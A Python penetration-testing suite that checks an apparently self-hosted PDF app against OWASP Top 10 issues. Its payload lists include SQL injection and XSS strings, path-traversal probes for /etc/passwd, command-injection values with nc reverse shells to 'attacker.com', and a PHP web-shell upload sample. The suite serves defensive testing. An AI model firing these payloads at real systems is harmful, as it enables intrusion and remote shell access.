"""
Comprehensive Security Testing Suite
Automated penetration testing for AI Enhanced PDF Scholar application.
"""

import asyncio
import json
import logging
import os
import re
import ssl
import time
import warnings
from datetime import datetime, timedelta
from typing import Any
from urllib.parse import urlparse

import aiohttp
import pytest
import requests
from cryptography import x509
from cryptography.hazmat.backends import default_backend

# Suppress warnings for security testing
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger(__name__)


# ============================================================================
# Security Test Configuration
# ============================================================================

class SecurityTestConfig:
    """Configuration for security tests."""

    def __init__(self):
        self.base_url = os.getenv("TEST_BASE_URL", "http://localhost:8000")
        self.api_base = f"{self.base_url}/api/v1"
        self.timeout = int(os.getenv("TEST_TIMEOUT", "30"))
        self.test_user_email = "security-test@example.com"
        self.test_user_password = "SecureTestPass123!"
        self.admin_email = os.getenv("ADMIN_EMAIL", "admin@example.com")
        self.admin_password = os.getenv("ADMIN_PASSWORD", "AdminSecurePass123!")

        # Security test parameters
        self.max_login_attempts = 5
        self.rate_limit_window = 60  # seconds
        self.password_min_length = 8
        self.session_timeout = 3600  # seconds

        # OWASP Top 10 test payloads
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users;--",
            "' UNION SELECT * FROM users--",
            "admin'--",
            "admin' /*",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "1' OR '1'='1' ORDER BY 1--",
            "1' UNION SELECT null,username,password FROM users--"
        ]

        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<<SCRIPT>alert('XSS')//<</SCRIPT>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
        ]

        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts",
            "....//....//....//etc/passwd",
            "%252e%252e%252f",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            "%c0%ae%c0%ae%c0%af",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
        ]

        self.command_injection_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "&& ls -la",
            "; ls; echo 'injection'",
            "`whoami`",
            "$(whoami)",
            "${IFS}cat${IFS}/etc/passwd",
            ";nc -e /bin/sh attacker.com 4444",
            "| nc -e /bin/sh attacker.com 4444",
            "&& nc -e /bin/sh attacker.com 4444"
        ]


config = SecurityTestConfig()


# ============================================================================
# Security Test Base Classes
# ============================================================================

class SecurityTestResult:
    """Results from security tests."""

    def __init__(self, test_name: str):
        self.test_name = test_name
        self.start_time = datetime.utcnow()
        self.end_time = None
        self.vulnerabilities = []
        self.passed_tests = []
        self.failed_tests = []
        self.warnings = []
        self.summary = {}

    def add_vulnerability(self, vulnerability: dict[str, Any]):
        """Add a vulnerability finding."""
        vulnerability['timestamp'] = datetime.utcnow().isoformat()
        self.vulnerabilities.append(vulnerability)

    def add_passed_test(self, test_name: str, details: dict[str, Any] = None):
        """Add a passed test."""
        self.passed_tests.append({
            'test': test_name,
            'details': details or {},
            'timestamp': datetime.utcnow().isoformat()
        })

    def add_failed_test(self, test_name: str, error: str, details: dict[str, Any] = None):
        """Add a failed test."""
        self.failed_tests.append({
            'test': test_name,
            'error': error,
            'details': details or {},
            'timestamp': datetime.utcnow().isoformat()
        })

    def add_warning(self, warning: str, details: dict[str, Any] = None):
        """Add a warning."""
        self.warnings.append({
            'warning': warning,
            'details': details or {},
            'timestamp': datetime.utcnow().isoformat()
        })

    def finalize(self):
        """Finalize the test results."""
        self.end_time = datetime.utcnow()
        duration = (self.end_time - self.start_time).total_seconds()

        self.summary = {
            'test_name': self.test_name,
            'duration_seconds': duration,
            'total_vulnerabilities': len(self.vulnerabilities),
            'critical_vulnerabilities': len([v for v in self.vulnerabilities if v.get('severity') == 'critical']),
            'high_vulnerabilities': len([v for v in self.vulnerabilities if v.get('severity') == 'high']),
            'medium_vulnerabilities': len([v for v in self.vulnerabilities if v.get('severity') == 'medium']),
            'low_vulnerabilities': len([v for v in self.vulnerabilities if v.get('severity') == 'low']),
            'passed_tests': len(self.passed_tests),
            'failed_tests': len(self.failed_tests),
            'warnings': len(self.warnings),
            'security_score': self._calculate_security_score()
        }

    def _calculate_security_score(self) -> float:
        """Calculate a security score based on findings."""
        base_score = 100.0

        # Deduct points for vulnerabilities
        for vuln in self.vulnerabilities:
            severity = vuln.get('severity', 'low')
            if severity == 'critical':
                base_score -= 30
            elif severity == 'high':
                base_score -= 20
            elif severity == 'medium':
                base_score -= 10
            elif severity == 'low':
                base_score -= 5

        # Deduct points for failed tests
        base_score -= len(self.failed_tests) * 2

        return max(0, base_score)

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            'summary': self.summary,
            'vulnerabilities': self.vulnerabilities,
            'passed_tests': self.passed_tests,
            'failed_tests': self.failed_tests,
            'warnings': self.warnings
        }


class SecurityTestBase:
    """Base class for security tests."""

    def __init__(self, config: SecurityTestConfig):
        self.config = config
        self.session = None
        self.auth_token = None
        self.admin_token = None

    async def setup(self):
        """Set up test environment."""
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.config.timeout),
            connector=aiohttp.TCPConnector(ssl=False)  # For testing
        )

    async def cleanup(self):
        """Clean up test environment."""
        if self.session:
            await self.session.close()

    async def authenticate_user(self) -> str | None:
        """Authenticate as regular user."""
        try:
            async with self.session.post(
                f"{self.config.api_base}/auth/login",
                json={
                    "email": self.config.test_user_email,
                    "password": self.config.test_user_password
                }
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    self.auth_token = data.get("access_token")
                    return self.auth_token
        except Exception as e:
            logger.error(f"User authentication failed: {e}")
        return None

    async def authenticate_admin(self) -> str | None:
        """Authenticate as admin user."""
        try:
            async with self.session.post(
                f"{self.config.api_base}/auth/login",
                json={
                    "email": self.config.admin_email,
                    "password": self.config.admin_password
                }
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    self.admin_token = data.get("access_token")
                    return self.admin_token
        except Exception as e:
            logger.error(f"Admin authentication failed: {e}")
        return None

    def get_auth_headers(self, token: str | None = None) -> dict[str, str]:
        """Get authentication headers."""
        token = token or self.auth_token
        if token:
            return {"Authorization": f"Bearer {token}"}
        return {}


# ============================================================================
# OWASP Top 10 Security Tests
# ============================================================================

class OWASPTOP10Tests(SecurityTestBase):
    """OWASP Top 10 2021 security tests."""

    async def test_a01_broken_access_control(self) -> SecurityTestResult:
        """A01:2021 – Broken Access Control."""
        result = SecurityTestResult("A01_Broken_Access_Control")

        try:
            # Test 1: Access admin endpoints without authentication
            admin_endpoints = [
                "/admin/users",
                "/admin/settings",
                "/admin/logs",
                "/api/v1/admin/users",
                "/api/v1/admin/system"
            ]

            for endpoint in admin_endpoints:
                try:
                    async with self.session.get(f"{self.config.base_url}{endpoint}") as response:
                        if response.status == 200:
                            result.add_vulnerability({
                                'severity': 'critical',
                                'type': 'Broken Access Control',
                                'description': f'Admin endpoint accessible without authentication: {endpoint}',
                                'endpoint': endpoint,
                                'response_status': response.status
                            })
                        elif response.status in [401, 403]:
                            result.add_passed_test(f"Access control on {endpoint}")
                except Exception as e:
                    result.add_warning(f"Could not test endpoint {endpoint}: {str(e)}")

            # Test 2: Access user data with different user credentials
            await self.authenticate_user()
            if self.auth_token:
                # Try to access other users' data
                user_ids = [1, 2, 3, 999, -1]
                for user_id in user_ids:
                    try:
                        async with self.session.get(
                            f"{self.config.api_base}/users/{user_id}",
                            headers=self.get_auth_headers()
                        ) as response:
                            if response.status == 200:
                                result.add_vulnerability({
                                    'severity': 'high',
                                    'type': 'Insecure Direct Object Reference',
                                    'description': f'Can access other user data: user_id={user_id}',
                                    'endpoint': f"/users/{user_id}",
                                    'response_status': response.status
                                })
                            elif response.status in [401, 403]:
                                result.add_passed_test(f"Access control on user {user_id}")
                    except Exception as e:
                        result.add_warning(f"Could not test user access for ID {user_id}: {str(e)}")

            # Test 3: Parameter pollution and tampering
            try:
                async with self.session.post(
                    f"{self.config.api_base}/documents/upload",
                    headers=self.get_auth_headers(),
                    data={"user_id": "999", "admin": "true"}
                ) as response:
                    if response.status == 200:
                        result.add_vulnerability({
                            'severity': 'high',
                            'type': 'Parameter Tampering',
                            'description': 'Application accepts tampered parameters',
                            'endpoint': '/documents/upload'
                        })
                    else:
                        result.add_passed_test("Parameter tampering protection")
            except Exception as e:
                result.add_warning(f"Parameter tampering test failed: {str(e)}")

        except Exception as e:
            result.add_failed_test("A01_Broken_Access_Control", str(e))

        result.finalize()
        return result

    async def test_a02_cryptographic_failures(self) -> SecurityTestResult:
        """A02:2021 – Cryptographic Failures."""
        result = SecurityTestResult("A02_Cryptographic_Failures")

        try:
            # Test 1: Check for HTTPS enforcement
            if self.config.base_url.startswith("http://"):
                result.add_vulnerability({
                    'severity': 'high',
                    'type': 'Insecure Transport',
                    'description': 'Application not enforcing HTTPS',
                    'recommendation': 'Implement HTTPS and redirect HTTP to HTTPS'
                })
            else:
                result.add_passed_test("HTTPS enforcement")

            # Test 2: Check SSL/TLS configuration
            if self.config.base_url.startswith("https://"):
                parsed_url = urlparse(self.config.base_url)
                try:
                    context = ssl.create_default_context()
                    with ssl.create_connection((parsed_url.hostname, parsed_url.port or 443)) as sock:
                        with context.wrap_socket(sock, server_hostname=parsed_url.hostname) as ssock:
                            cert = ssock.getpeercert(True)
                            x509_cert = x509.load_der_x509_certificate(cert, default_backend())

                            # Check certificate validity
                            now = datetime.utcnow()
                            if x509_cert.not_valid_after < now:
                                result.add_vulnerability({
                                    'severity': 'critical',
                                    'type': 'Expired Certificate',
                                    'description': 'SSL certificate has expired'
                                })
                            elif x509_cert.not_valid_after < now + timedelta(days=30):
                                result.add_warning("SSL certificate expires within 30 days")
                            else:
                                result.add_passed_test("SSL certificate validity")

                            # Check SSL version
                            if ssock.version() in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                                result.add_vulnerability({
                                    'severity': 'high',
                                    'type': 'Weak SSL/TLS Version',
                                    'description': f'Weak SSL/TLS version: {ssock.version()}',
                                    'recommendation': 'Use TLS 1.2 or higher'
                                })
                            else:
                                result.add_passed_test(f"SSL/TLS version: {ssock.version()}")

                except Exception as e:
                    result.add_warning(f"SSL/TLS test failed: {str(e)}")

            # Test 3: Check for sensitive data in error messages
            try:
                async with self.session.post(
                    f"{self.config.api_base}/auth/login",
                    json={"email": "test@example.com", "password": "wrongpassword"}
                ) as response:
                    if response.status == 401:
                        data = await response.json()
                        error_msg = data.get("message", "").lower()

                        # Check for information disclosure in error messages
                        sensitive_patterns = [
                            r'user not found',
                            r'invalid user',
                            r'user does not exist',
                            r'database error',
                            r'sql',
                            r'stack trace'
                        ]

                        for pattern in sensitive_patterns:
                            if re.search(pattern, error_msg):
                                result.add_vulnerability({
                                    'severity': 'medium',
                                    'type': 'Information Disclosure',
                                    'description': f'Error message reveals sensitive information: {error_msg}',
                                    'recommendation': 'Use generic error messages'
                                })
                                break
                        else:
                            result.add_passed_test("Generic error messages")
            except Exception as e:
                result.add_warning(f"Error message test failed: {str(e)}")

        except Exception as e:
            result.add_failed_test("A02_Cryptographic_Failures", str(e))

        result.finalize()
        return result

    async def test_a03_injection(self) -> SecurityTestResult:
        """A03:2021 – Injection."""
        result = SecurityTestResult("A03_Injection")

        try:
            await self.authenticate_user()

            # Test 1: SQL Injection
            for payload in self.config.sqli_payloads:
                # Test login endpoint
                try:
                    async with self.session.post(
                        f"{self.config.api_base}/auth/login",
                        json={"email": payload, "password": "password"}
                    ) as response:
                        if response.status == 200:
                            result.add_vulnerability({
                                'severity': 'critical',
                                'type': 'SQL Injection',
                                'description': f'SQL injection successful with payload: {payload}',
                                'endpoint': '/auth/login',
                                'payload': payload
                            })
                        else:
                            result.add_passed_test(f"SQL injection protection - login with payload: {payload[:20]}")
                except Exception as e:
                    result.add_warning(f"SQL injection test failed with payload {payload}: {str(e)}")

                # Test search endpoint
                if self.auth_token:
                    try:
                        async with self.session.get(
                            f"{self.config.api_base}/documents/search",
                            params={"query": payload},
                            headers=self.get_auth_headers()
                        ) as response:
                            if response.status == 500:
                                response_text = await response.text()
                                if any(keyword in response_text.lower() for keyword in ['sql', 'database', 'syntax']):
                                    result.add_vulnerability({
                                        'severity': 'high',
                                        'type': 'SQL Injection Error',
                                        'description': f'Database error exposed with payload: {payload}',
                                        'endpoint': '/documents/search',
                                        'payload': payload
                                    })
                            else:
                                result.add_passed_test(f"SQL injection protection - search with payload: {payload[:20]}")
                    except Exception as e:
                        result.add_warning(f"Search SQL injection test failed: {str(e)}")

            # Test 2: Command Injection
            for payload in self.config.command_injection_payloads:
                try:
                    # Test file upload with malicious filename
                    async with self.session.post(
                        f"{self.config.api_base}/documents/upload",
                        data={"filename": payload, "content": "test content"},
                        headers=self.get_auth_headers()
                    ) as response:
                        if response.status == 500:
                            response_text = await response.text()
                            if any(keyword in response_text.lower() for keyword in ['command', 'shell', 'exec']):
                                result.add_vulnerability({
                                    'severity': 'critical',
                                    'type': 'Command Injection',
                                    'description': f'Command injection possible with payload: {payload}',
                                    'endpoint': '/documents/upload',
                                    'payload': payload
                                })
                        else:
                            result.add_passed_test(f"Command injection protection: {payload[:20]}")
                except Exception as e:
                    result.add_warning(f"Command injection test failed: {str(e)}")

            # Test 3: LDAP Injection (if applicable)
            ldap_payloads = [
                "*)(&",
                "*)(objectClass=*",
                ")(cn=*",
                "admin*)((|userPassword=*",
                "*)(|(objectClass=*))"
            ]

            for payload in ldap_payloads:
                try:
                    async with self.session.post(
                        f"{self.config.api_base}/auth/login",
                        json={"username": payload, "password": "password"}
                    ) as response:
                        if response.status == 200:
                            result.add_vulnerability({
                                'severity': 'high',
                                'type': 'LDAP Injection',
                                'description': f'LDAP injection successful with payload: {payload}',
                                'endpoint': '/auth/login',
                                'payload': payload
                            })
                        else:
                            result.add_passed_test(f"LDAP injection protection: {payload}")
                except Exception as e:
                    result.add_warning(f"LDAP injection test failed: {str(e)}")

        except Exception as e:
            result.add_failed_test("A03_Injection", str(e))

        result.finalize()
        return result

    async def test_a04_insecure_design(self) -> SecurityTestResult:
        """A04:2021 – Insecure Design."""
        result = SecurityTestResult("A04_Insecure_Design")

        try:
            # Test 1: Password policy enforcement
            weak_passwords = [
                "123456",
                "password",
                "admin",
                "test",
                "a",
                "12345678"
            ]

            for weak_password in weak_passwords:
                try:
                    async with self.session.post(
                        f"{self.config.api_base}/auth/register",
                        json={
                            "email": f"test_{int(time.time())}@example.com",
                            "password": weak_password,
                            "confirm_password": weak_password
                        }
                    ) as response:
                        if response.status == 201:
                            result.add_vulnerability({
                                'severity': 'medium',
                                'type': 'Weak Password Policy',
                                'description': f'Weak password accepted: {weak_password}',
                                'recommendation': 'Implement strong password policy'
                            })
                        else:
                            result.add_passed_test(f"Password policy rejects weak password: {weak_password}")
                except Exception as e:
                    result.add_warning(f"Password policy test failed: {str(e)}")

            # Test 2: Rate limiting on sensitive operations
            await self.authenticate_user()

            # Test login rate limiting
            failed_attempts = 0
            for i in range(self.config.max_login_attempts + 2):
                try:
                    async with self.session.post(
                        f"{self.config.api_base}/auth/login",
                        json={
                            "email": "nonexistent@example.com",
                            "password": "wrongpassword"
                        }
                    ) as response:
                        if response.status == 401:
                            failed_attempts += 1
                        elif response.status == 429:  # Too many requests
                            result.add_passed_test("Rate limiting on login attempts")
                            break
                except Exception as e:
                    result.add_warning(f"Rate limiting test failed: {str(e)}")
            else:
                if failed_attempts > self.config.max_login_attempts:
                    result.add_vulnerability({
                        'severity': 'medium',
                        'type': 'Missing Rate Limiting',
                        'description': 'No rate limiting on login attempts',
                        'recommendation': 'Implement rate limiting for authentication'
                    })

            # Test 3: Account enumeration
            existing_emails = ["admin@example.com", "user@example.com"]
            nonexistent_emails = ["nonexistent1@example.com", "nonexistent2@example.com"]

            timing_differences = []

            for email_list, label in [(existing_emails, "existing"), (nonexistent_emails, "nonexistent")]:
                for email in email_list:
                    start_time = time.time()
                    try:
                        async with self.session.post(
                            f"{self.config.api_base}/auth/forgot-password",
                            json={"email": email}
                        ) as response:
                            end_time = time.time()
                            timing_differences.append({
                                'email_type': label,
                                'response_time': end_time - start_time,
                                'status_code': response.status
                            })
                    except Exception as e:
                        result.add_warning(f"Account enumeration test failed: {str(e)}")

            # Analyze timing differences
            if len(timing_differences) >= 2:
                existing_times = [t['response_time'] for t in timing_differences if t['email_type'] == 'existing']
                nonexistent_times = [t['response_time'] for t in timing_differences if t['email_type'] == 'nonexistent']

                if existing_times and nonexistent_times:
                    avg_existing = sum(existing_times) / len(existing_times)
                    avg_nonexistent = sum(nonexistent_times) / len(nonexistent_times)

                    # If there's a significant timing difference (>100ms)
                    if abs(avg_existing - avg_nonexistent) > 0.1:
                        result.add_vulnerability({
                            'severity': 'medium',
                            'type': 'Account Enumeration',
                            'description': 'Timing attack possible for account enumeration',
                            'details': {
                                'avg_existing_response_time': avg_existing,
                                'avg_nonexistent_response_time': avg_nonexistent
                            }
                        })
                    else:
                        result.add_passed_test("Account enumeration protection via timing")

        except Exception as e:
            result.add_failed_test("A04_Insecure_Design", str(e))

        result.finalize()
        return result

    async def test_a05_security_misconfiguration(self) -> SecurityTestResult:
        """A05:2021 – Security Misconfiguration."""
        result = SecurityTestResult("A05_Security_Misconfiguration")

        try:
            # Test 1: Debug information exposure
            try:
                async with self.session.get(f"{self.config.base_url}/debug") as response:
                    if response.status == 200:
                        result.add_vulnerability({
                            'severity': 'high',
                            'type': 'Debug Information Exposure',
                            'description': 'Debug endpoint accessible in production'
                        })
                    else:
                        result.add_passed_test("Debug endpoint protection")
            except Exception as e:
                result.add_warning(f"Debug endpoint test failed: {str(e)}")

            # Test 2: Default credentials
            default_creds = [
                ("admin", "admin"),
                ("administrator", "password"),
                ("root", "root"),
                ("admin", "password"),
                ("test", "test")
            ]

            for username, password in default_creds:
                try:
                    async with self.session.post(
                        f"{self.config.api_base}/auth/login",
                        json={"email": f"{username}@example.com", "password": password}
                    ) as response:
                        if response.status == 200:
                            result.add_vulnerability({
                                'severity': 'critical',
                                'type': 'Default Credentials',
                                'description': f'Default credentials work: {username}/{password}'
                            })
                        else:
                            result.add_passed_test(f"Default credentials rejected: {username}/{password}")
                except Exception as e:
                    result.add_warning(f"Default credentials test failed: {str(e)}")

            # Test 3: HTTP security headers
            try:
                async with self.session.get(self.config.base_url) as response:
                    headers = response.headers

                    security_headers = {
                        'Strict-Transport-Security': 'HSTS header missing',
                        'X-Content-Type-Options': 'X-Content-Type-Options header missing',
                        'X-Frame-Options': 'X-Frame-Options header missing',
                        'X-XSS-Protection': 'X-XSS-Protection header missing',
                        'Content-Security-Policy': 'CSP header missing',
                        'Referrer-Policy': 'Referrer-Policy header missing'
                    }

                    for header, message in security_headers.items():
                        if header not in headers:
                            result.add_vulnerability({
                                'severity': 'medium',
                                'type': 'Missing Security Header',
                                'description': message,
                                'recommendation': f'Add {header} header'
                            })
                        else:
                            result.add_passed_test(f"Security header present: {header}")

                    # Check for information disclosure headers
                    disclosure_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
                    for header in disclosure_headers:
                        if header in headers:
                            result.add_vulnerability({
                                'severity': 'low',
                                'type': 'Information Disclosure',
                                'description': f'Information disclosure header: {header}: {headers[header]}',
                                'recommendation': f'Remove {header} header'
                            })
                        else:
                            result.add_passed_test(f"Information disclosure header removed: {header}")

            except Exception as e:
                result.add_warning(f"Security headers test failed: {str(e)}")

            # Test 4: Directory listing
            common_dirs = [
                "/admin/",
                "/backup/",
                "/config/",
                "/logs/",
                "/temp/",
                "/uploads/",
                "/.git/",
                "/database/"
            ]

            for directory in common_dirs:
                try:
                    async with self.session.get(f"{self.config.base_url}{directory}") as response:
                        if response.status == 200:
                            content = await response.text()
                            if "Index of" in content or "Directory listing" in content:
                                result.add_vulnerability({
                                    'severity': 'medium',
                                    'type': 'Directory Listing',
                                    'description': f'Directory listing enabled: {directory}',
                                    'recommendation': 'Disable directory listing'
                                })
                            else:
                                result.add_passed_test(f"Directory listing disabled: {directory}")
                        else:
                            result.add_passed_test(f"Directory protected: {directory}")
                except Exception as e:
                    result.add_warning(f"Directory listing test failed for {directory}: {str(e)}")

        except Exception as e:
            result.add_failed_test("A05_Security_Misconfiguration", str(e))

        result.finalize()
        return result


# ============================================================================
# Additional Security Tests
# ============================================================================

class AdditionalSecurityTests(SecurityTestBase):
    """Additional security tests beyond OWASP Top 10."""

    async def test_session_management(self) -> SecurityTestResult:
        """Test session management security."""
        result = SecurityTestResult("Session_Management")

        try:
            # Test 1: Session fixation
            await self.authenticate_user()
            if self.auth_token:
                # Store original token
                original_token = self.auth_token

                # Authenticate again
                await self.authenticate_user()
                new_token = self.auth_token

                if original_token == new_token:
                    result.add_vulnerability({
                        'severity': 'medium',
                        'type': 'Session Fixation',
                        'description': 'Same token returned after re-authentication'
                    })
                else:
                    result.add_passed_test("Session fixation protection")

            # Test 2: Session timeout
            if self.auth_token:
                try:
                    # Wait and test if session expires (simulate with old token)
                    fake_old_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MjM4OTY0MDAsInVzZXIiOiJ0ZXN0In0.test"

                    async with self.session.get(
                        f"{self.config.api_base}/user/profile",
                        headers={"Authorization": f"Bearer {fake_old_token}"}
                    ) as response:
                        if response.status == 401:
                            result.add_passed_test("Session expiration handling")
                        else:
                            result.add_warning("Could not verify session expiration")
                except Exception as e:
                    result.add_warning(f"Session timeout test failed: {str(e)}")

            # Test 3: Concurrent sessions
            if self.auth_token:
                # Try to use the same credentials from another "session"
                async with aiohttp.ClientSession() as second_session:
                    async with second_session.post(
                        f"{self.config.api_base}/auth/login",
                        json={
                            "email": self.config.test_user_email,
                            "password": self.config.test_user_password
                        }
                    ) as response:
                        if response.status == 200:
                            data = await response.json()
                            second_token = data.get("access_token")

                            # Check if both tokens are valid
                            if second_token and second_token != self.auth_token:
                                # Both sessions should work or old should be invalidated
                                async with self.session.get(
                                    f"{self.config.api_base}/user/profile",
                                    headers=self.get_auth_headers()
                                ) as first_response:
                                    async with second_session.get(
                                        f"{self.config.api_base}/user/profile",
                                        headers={"Authorization": f"Bearer {second_token}"}
                                    ) as second_response:

                                        if first_response.status == 200 and second_response.status == 200:
                                            result.add_warning("Multiple concurrent sessions allowed")
                                        elif first_response.status == 401 and second_response.status == 200:
                                            result.add_passed_test("Session invalidation on new login")
                                        else:
                                            result.add_passed_test("Concurrent session handling")

        except Exception as e:
            result.add_failed_test("Session_Management", str(e))

        result.finalize()
        return result

    async def test_input_validation(self) -> SecurityTestResult:
        """Test input validation and sanitization."""
        result = SecurityTestResult("Input_Validation")

        try:
            await self.authenticate_user()

            # Test 1: XSS protection
            for payload in self.config.xss_payloads:
                try:
                    # Test in document upload
                    async with self.session.post(
                        f"{self.config.api_base}/documents/upload",
                        json={
                            "title": payload,
                            "content": f"Test content with XSS: {payload}"
                        },
                        headers=self.get_auth_headers()
                    ) as response:
                        if response.status == 200:
                            # Check if the response contains unsanitized payload
                            data = await response.json()
                            if payload in str(data):
                                result.add_vulnerability({
                                    'severity': 'high',
                                    'type': 'Cross-Site Scripting (XSS)',
                                    'description': f'XSS payload not sanitized: {payload}',
                                    'endpoint': '/documents/upload',
                                    'payload': payload
                                })
                            else:
                                result.add_passed_test(f"XSS protection: {payload[:20]}")
                        else:
                            result.add_passed_test(f"XSS payload rejected: {payload[:20]}")

                except Exception as e:
                    result.add_warning(f"XSS test failed: {str(e)}")

            # Test 2: Path traversal
            for payload in self.config.path_traversal_payloads:
                try:
                    async with self.session.get(
                        f"{self.config.api_base}/documents/{payload}",
                        headers=self.get_auth_headers()
                    ) as response:
                        if response.status == 200:
                            content = await response.text()
                            # Check for system files content
                            if any(keyword in content.lower() for keyword in ['root:', 'admin:', '[boot loader]']):
                                result.add_vulnerability({
                                    'severity': 'critical',
                                    'type': 'Path Traversal',
                                    'description': f'Path traversal successful: {payload}',
                                    'payload': payload
                                })
                            else:
                                result.add_passed_test(f"Path traversal protection: {payload[:20]}")
                        else:
                            result.add_passed_test(f"Path traversal blocked: {payload[:20]}")

                except Exception as e:
                    result.add_warning(f"Path traversal test failed: {str(e)}")

            # Test 3: File upload validation
            malicious_files = [
                ("malware.exe", b"MZ\x90\x00", "application/octet-stream"),
                ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
                ("script.js", b"alert('XSS')", "application/javascript"),
                ("../../etc/passwd", b"root:x:0:0:", "text/plain")
            ]

            for filename, content, content_type in malicious_files:
                try:
                    data = aiohttp.FormData()
                    data.add_field('file', content, filename=filename, content_type=content_type)

                    async with self.session.post(
                        f"{self.config.api_base}/documents/upload",
                        data=data,
                        headers=self.get_auth_headers()
                    ) as response:
                        if response.status == 200:
                            result.add_vulnerability({
                                'severity': 'high',
                                'type': 'Malicious File Upload',
                                'description': f'Malicious file accepted: {filename}',
                                'filename': filename,
                                'content_type': content_type
                            })
                        else:
                            result.add_passed_test(f"Malicious file rejected: {filename}")

                except Exception as e:
                    result.add_warning(f"File upload test failed for {filename}: {str(e)}")

        except Exception as e:
            result.add_failed_test("Input_Validation", str(e))

        result.finalize()
        return result


# ============================================================================
# Security Test Runner
# ============================================================================

class SecurityTestRunner:
    """Main security test runner."""

    def __init__(self, config: SecurityTestConfig):
        self.config = config
        self.results = []

    async def run_all_tests(self) -> dict[str, Any]:
        """Run all security tests."""
        logger.info("Starting comprehensive security test suite")

        start_time = datetime.utcnow()

        # Initialize test classes
        owasp_tests = OWASPTOP10Tests(self.config)
        additional_tests = AdditionalSecurityTests(self.config)

        try:
            # Setup test environment
            await owasp_tests.setup()
            await additional_tests.setup()

            # Run OWASP Top 10 tests
            owasp_test_methods = [
                owasp_tests.test_a01_broken_access_control,
                owasp_tests.test_a02_cryptographic_failures,
                owasp_tests.test_a03_injection,
                owasp_tests.test_a04_insecure_design,
                owasp_tests.test_a05_security_misconfiguration
            ]

            for test_method in owasp_test_methods:
                try:
                    logger.info(f"Running {test_method.__name__}")
                    result = await test_method()
                    self.results.append(result)
                except Exception as e:
                    logger.error(f"Test {test_method.__name__} failed: {e}")

            # Run additional tests
            additional_test_methods = [
                additional_tests.test_session_management,
                additional_tests.test_input_validation
            ]

            for test_method in additional_test_methods:
                try:
                    logger.info(f"Running {test_method.__name__}")
                    result = await test_method()
                    self.results.append(result)
                except Exception as e:
                    logger.error(f"Test {test_method.__name__} failed: {e}")

        finally:
            # Cleanup
            await owasp_tests.cleanup()
            await additional_tests.cleanup()

        end_time = datetime.utcnow()

        # Generate final report
        report = self._generate_report(start_time, end_time)

        logger.info("Security test suite completed")
        return report

    def _generate_report(self, start_time: datetime, end_time: datetime) -> dict[str, Any]:
        """Generate comprehensive security test report."""
        total_duration = (end_time - start_time).total_seconds()

        # Aggregate results
        all_vulnerabilities = []
        all_passed_tests = []
        all_failed_tests = []
        all_warnings = []

        for result in self.results:
            all_vulnerabilities.extend(result.vulnerabilities)
            all_passed_tests.extend(result.passed_tests)
            all_failed_tests.extend(result.failed_tests)
            all_warnings.extend(result.warnings)

        # Calculate overall security score
        total_tests = len(all_passed_tests) + len(all_failed_tests)
        pass_rate = (len(all_passed_tests) / total_tests * 100) if total_tests > 0 else 0

        # Categorize vulnerabilities by severity
        severity_counts = {
            'critical': len([v for v in all_vulnerabilities if v.get('severity') == 'critical']),
            'high': len([v for v in all_vulnerabilities if v.get('severity') == 'high']),
            'medium': len([v for v in all_vulnerabilities if v.get('severity') == 'medium']),
            'low': len([v for v in all_vulnerabilities if v.get('severity') == 'low'])
        }

        # Calculate overall security score
        base_score = 100.0
        base_score -= severity_counts['critical'] * 25
        base_score -= severity_counts['high'] * 15
        base_score -= severity_counts['medium'] * 10
        base_score -= severity_counts['low'] * 5
        base_score -= len(all_failed_tests) * 2
        overall_security_score = max(0, base_score)

        # Generate recommendations
        recommendations = self._generate_recommendations(all_vulnerabilities)

        return {
            'summary': {
                'test_start_time': start_time.isoformat(),
                'test_end_time': end_time.isoformat(),
                'total_duration_seconds': total_duration,
                'total_tests_run': len(self.results),
                'total_vulnerabilities': len(all_vulnerabilities),
                'vulnerability_breakdown': severity_counts,
                'passed_tests': len(all_passed_tests),
                'failed_tests': len(all_failed_tests),
                'warnings': len(all_warnings),
                'pass_rate_percent': round(pass_rate, 2),
                'overall_security_score': round(overall_security_score, 2)
            },
            'detailed_results': [result.to_dict() for result in self.results],
            'all_vulnerabilities': all_vulnerabilities,
            'recommendations': recommendations,
            'compliance_status': self._check_compliance(all_vulnerabilities)
        }

    def _generate_recommendations(self, vulnerabilities: list[dict[str, Any]]) -> list[dict[str, Any]]:
        """Generate security recommendations based on findings."""
        recommendations = []

        # Group vulnerabilities by type
        vuln_types = {}
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', 'Unknown')
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = []
            vuln_types[vuln_type].append(vuln)

        # Generate recommendations for each vulnerability type
        for vuln_type, vulns in vuln_types.items():
            severity = max([v.get('severity', 'low') for v in vulns],
                          key=lambda x: ['low', 'medium', 'high', 'critical'].index(x))

            recommendations.append({
                'vulnerability_type': vuln_type,
                'severity': severity,
                'count': len(vulns),
                'recommendation': self._get_recommendation_for_type(vuln_type),
